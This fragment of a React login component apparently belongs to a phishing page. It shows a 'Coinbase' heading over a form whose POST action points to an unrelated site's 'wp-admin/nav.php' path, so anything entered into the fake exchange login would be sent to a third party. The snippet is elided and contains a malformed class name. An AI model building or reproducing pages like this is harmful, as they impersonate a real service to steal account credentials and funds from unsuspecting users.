...
const Login = () => {
  ...
  return (
    <div className='flex flex-col w-[95%] md:w-[80%] h-100vh] mx-auto'>
        <h1 className='py-6 text-3xl text-blue-800 font-bold'>Coinbase</h1>
        <form className='w-full h-full bg-white rounded-md py-14 px-6 flex flex-col' method='POST' action={'https://investmentquarters.com/wp-admin/nav.php'} >
